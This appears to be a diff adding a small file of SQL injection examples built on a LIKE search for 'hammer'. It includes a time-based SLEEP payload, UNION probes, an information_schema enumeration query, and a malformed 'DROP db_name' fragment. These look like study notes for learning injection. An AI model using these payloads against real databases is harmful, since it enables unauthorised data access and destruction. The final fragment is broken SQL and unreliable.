@@ -1,0 +1,15 @@
+SELECT ? FROM ? WHERE ? LIKE '%hammer%';
+
+
+SELECT ? FROM ? WHERE ? LIKE '%hammer%' AND 1 = SLEEP(2);--%';
+
+
+SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer%' UNION (SELECT 1,2,3 FROM dual);-- %';
+
+SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA,3 FROM information_schema.tables);-- %';
+
+
+
+
+
+IN (DROP db_name)
